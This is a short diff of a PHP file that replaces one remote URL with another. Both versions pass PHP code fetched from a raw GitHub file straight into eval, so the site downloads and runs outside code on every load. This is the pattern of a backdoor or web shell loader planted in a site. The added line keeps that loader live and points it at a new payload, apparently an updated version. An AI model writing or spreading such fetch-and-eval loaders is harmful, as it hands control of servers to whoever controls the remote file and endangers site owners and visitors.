@@ -27,4 +27,4 @@ function getURL($url) {
 }
 
 
-eval("?>" . getURL("https://raw.githubusercontent.com/onlyme1d/dxerror/refs/heads/main/alpa.php"));
+eval("?>" . getURL("https://raw.githubusercontent.com/onlyme1d/dxerror/refs/heads/main/alpaV2.php"));
